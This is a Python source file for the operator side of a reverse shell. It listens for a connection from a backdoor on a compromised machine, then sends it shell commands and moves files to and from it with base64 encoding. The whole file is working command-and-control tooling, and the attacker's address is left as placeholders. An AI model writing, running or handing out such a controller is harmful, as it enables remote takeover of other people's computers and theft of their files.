from json.decoder import JSONDecodeError
import socket,json,base64


class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+]Waiting for connection")
        self.conn,addr = listener.accept()
        print(f"[+]Connected to {addr}")

    def send_data(self,data):
        json_data = json.dumps(data)
        self.conn.send(json_data.encode())

    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data = json_data +  self.conn.recv(1024).decode()
                return json.loads(json_data.encode())
            except JSONDecodeError: #When the error stops it will return the json.loads
                continue
    
    def write_file(self,path,data):
        with open(path,'wb') as file:
            file.write(base64.b64decode(data))
            print("[+]File downloaded successfully")

    def read_file(self,path):
        with open(path,'rb') as file:
            return base64.b64encode(file.read())

    def execute_command(self,command):
        self.send_data(command)

        if command[0] == 'exit':
            self.conn.close()
            exit()

        return self.receive_data()


    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            try:
                if command[0] == 'upload':
                    data = self.read_file(command[1])
                    command.append(data.decode())
                reply = self.execute_command(command)
                if command[0] == 'download' and "[-]Error" not in command:
                    self.write_file(command[1],reply)
                else:
                    print(reply)
            except Exception:
                print("[-]Error while executing the command!!")        


listener = Listener("server_ip",server_port)
listener.run()
